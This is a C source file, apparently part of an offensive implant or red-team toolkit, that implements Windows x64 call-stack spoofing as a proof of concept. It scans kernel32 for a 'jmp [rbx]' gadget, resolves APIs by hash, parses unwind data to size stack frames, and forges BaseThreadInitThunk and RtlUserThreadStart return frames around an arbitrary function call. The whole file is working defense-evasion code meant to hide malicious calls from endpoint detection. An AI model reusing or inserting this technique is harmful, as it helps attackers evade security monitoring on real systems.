#include "spoof.h"
#include "api.h"
#include "hash.h"

#pragma code_seg(".text$e")
BOOL IsGadget(PBYTE data)
{
    if (data[0] == 0xFF && data[1] == 0x23)
    {
        return TRUE;
    }
    else
    {
        return FALSE;
    }
}

#pragma code_seg(".text$e")
PVOID FindGadget(LPBYTE Module, ULONG Size)
{
    for (int x = 0; x < Size; x++)
    {
        if (IsGadget(Module + x))
        {
            return (PVOID)(Module + x);
        };
    };

    return NULL;
}

#pragma code_seg(".text$e")
ULONG CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, const DWORD64 ImageBase, StackFrame* stackFrame)
{
    NTSTATUS status = STATUS_SUCCESS;
    PUNWIND_INFO pUnwindInfo = NULL;
    ULONG unwindOperation = 0;
    ULONG operationInfo = 0;
    ULONG index = 0;
    ULONG frameOffset = 0;


    // [0] Sanity check incoming pointer.
    if (!pRuntimeFunction)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    // [1] Loop over unwind info.
    // NB As this is a PoC, it does not handle every unwind operation, but
    // rather the minimum set required to successfully mimic the default
    // call stacks included.
    pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + ImageBase);
    while (index < pUnwindInfo->CountOfCodes)
    {
        unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
        operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;
        // [2] Loop over unwind codes and calculate
        // total stack space used by target Function.
        switch (unwindOperation) {
        case UWOP_PUSH_NONVOL:
            // UWOP_PUSH_NONVOL is 8 bytes.
            stackFrame->totalStackSize += 8;
            // Record if it pushes rbp as
            // this is important for UWOP_SET_FPREG.
            if (RBP_OP_INFO == operationInfo)
            {
                stackFrame->pushRbp = true;
                // Record when rbp is pushed to stack.
                stackFrame->countOfCodes = pUnwindInfo->CountOfCodes;
                stackFrame->pushRbpIndex = index + 1;
            }
            break;
        case UWOP_SAVE_NONVOL:
            //UWOP_SAVE_NONVOL doesn't contribute to stack size
            // but you do need to increment index.
            index += 1;
            break;
        case UWOP_ALLOC_SMALL:
            //Alloc size is op info field * 8 + 8.
            stackFrame->totalStackSize += ((operationInfo * 8) + 8);
            break;
        case UWOP_ALLOC_LARGE:
            // Alloc large is either:
            // 1) If op info == 0 then size of alloc / 8
            // is in the next slot (i.e. index += 1).
            // 2) If op info == 1 then size is in next
            // two slots.
            index += 1;
            frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
            if (operationInfo == 0)
            {
                frameOffset *= 8;
            }
            else
            {
                index += 1;
                frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16);
            }
            stackFrame->totalStackSize += frameOffset;
            break;
        case UWOP_SET_FPREG:
            // This sets rsp == rbp (mov rsp,rbp), so we need to ensure
            // that rbp is the expected value (in the frame above) when
            // it comes to spoof this frame in order to ensure the
            // call stack is correctly unwound.
            stackFrame->setsFramePointer = true;
            break;
        default:
            status = STATUS_ASSERTION_FAILURE;
            break;
        }

        index += 1;
    }

    // If chained unwind information is present then we need to
    // also recursively parse this and add to total stack size.
    if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO))
    {
        index = pUnwindInfo->CountOfCodes;
        if (0 != (index & 1))
        {
            index += 1;
        }
        pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[index]);
        return CalculateFunctionStackSize(pRuntimeFunction, ImageBase, stackFrame);
    }

    // Add the size of the return address (8 bytes).
    stackFrame->totalStackSize += 8;

    return stackFrame->totalStackSize;
Cleanup:
    return status;
}


#pragma code_seg(".text$e")
ULONG CalculateFunctionStackSizeWrapper(PVOID ReturnAddress)
{
    NTSTATUS status = STATUS_SUCCESS;
    PRUNTIME_FUNCTION pRuntimeFunction = NULL;
    DWORD64 ImageBase = 0;
    PUNWIND_HISTORY_TABLE pHistoryTable = NULL;

    void* pKernel32 = xGetModuleAddr(KERNEL32_HASH);

    RTLLOOKUPFUNCTIONENTRY fnRtlLookupFunctionEntry = (RTLLOOKUPFUNCTIONENTRY)xGetProcAddr(pKernel32, RTLLOOKUPFUNCTIONENTRY_HASH);
    // [0] Sanity check return address.
    if (!ReturnAddress)
    {
        status = STATUS_INVALID_PARAMETER;
        return status;
    }

    // [1] Locate RUNTIME_FUNCTION for given Function.
    pRuntimeFunction = fnRtlLookupFunctionEntry((DWORD64)ReturnAddress, &ImageBase, pHistoryTable);
    if (NULL == pRuntimeFunction)
    {
        status = STATUS_ASSERTION_FAILURE;
        return status;
    }

    // [2] Recursively calculate the total stack size for
    StackFrame stackFrame = { 0 };
    return CalculateFunctionStackSize(pRuntimeFunction, ImageBase, &stackFrame);
}


#pragma code_seg(".text$e")
void* Spoofer(void* pFunctionAddr, void* arg1, void* arg2, void* arg3, void* arg4, void* arg5, void* arg6, void* arg7, void* arg8)
{

    PVOID ReturnAddress = NULL;
    PRM p = { 0 };
    PRM ogp = { 0 };
    NTSTATUS status = STATUS_SUCCESS;

    void* pKernel32 = xGetModuleAddr(KERNEL32_HASH);
    void* pNtdll = xGetModuleAddr(NTDLL_HASH);

    p.trampoline = FindGadget((LPBYTE)pKernel32, 0x200000); // ok

    UINT_PTR uiBaseThreadInitThunk = (UINT_PTR)xGetProcAddr(pKernel32, BASETHREADINITTHUNK_HASH); // ok
    uiBaseThreadInitThunk += 0x14;

    p.BTIT_ss = (PVOID)CalculateFunctionStackSizeWrapper((PVOID)uiBaseThreadInitThunk);
    p.BTIT_retaddr = (PVOID)uiBaseThreadInitThunk;

    UINT_PTR uiRtlUserThreadStart = (UINT_PTR)xGetProcAddr(pNtdll, RTLUSERTHREADSTART_HASH); // ok
    uiRtlUserThreadStart += 0x21;

    p.RUTS_ss = (PVOID)CalculateFunctionStackSizeWrapper((PVOID)uiRtlUserThreadStart);
    p.RUTS_retaddr = (PVOID)uiRtlUserThreadStart;

    p.Gadget_ss = (PVOID)CalculateFunctionStackSizeWrapper(p.trampoline);

    void* ret = Spoof(arg1, arg2, arg3, arg4, &p, pFunctionAddr, (PVOID)4, arg5, arg6, arg7, arg8);
    return ret;
}
